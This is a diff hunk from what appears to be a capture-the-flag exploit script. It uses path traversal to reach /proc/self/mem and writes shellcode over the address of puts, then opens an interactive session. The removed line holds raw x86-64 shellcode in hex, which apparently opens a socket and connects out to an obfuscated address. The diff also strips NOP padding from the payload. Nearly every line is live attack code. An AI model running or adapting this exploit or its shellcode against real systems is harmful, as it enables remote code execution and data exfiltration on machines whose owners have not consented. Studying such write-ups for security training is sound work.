@@ -170,7 +170,6 @@ log.info(f'Shellcode = {shellcode}')
 # write 2 /proc/self/mem
 file_name = b'/proc/self/mem'
 path = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
-# shellcode = bytes.fromhex('4831ff40b7024831f640b6014831d24831c0b0290f054989c04c89c74831d2b2104831c0b02a4d31c9415148c7c6ffffffff49b9fdffddc280fffffe4c29ce564889e60f054d31c96641b9878741514c89c74889e64831d2b2a44831c0b0010f054831c04c89c74889e64831d266ba04010f054831ff40b7014889e64831d2b2404831c0b0010f05')
-dealing_cmd(r, 4, note_name=path, content=shellcode + b"\x90" * 0x10, offset=puts_addr)
+dealing_cmd(r, 4, note_name=path, content=shellcode, offset=puts_addr)
 
 r.interactive()
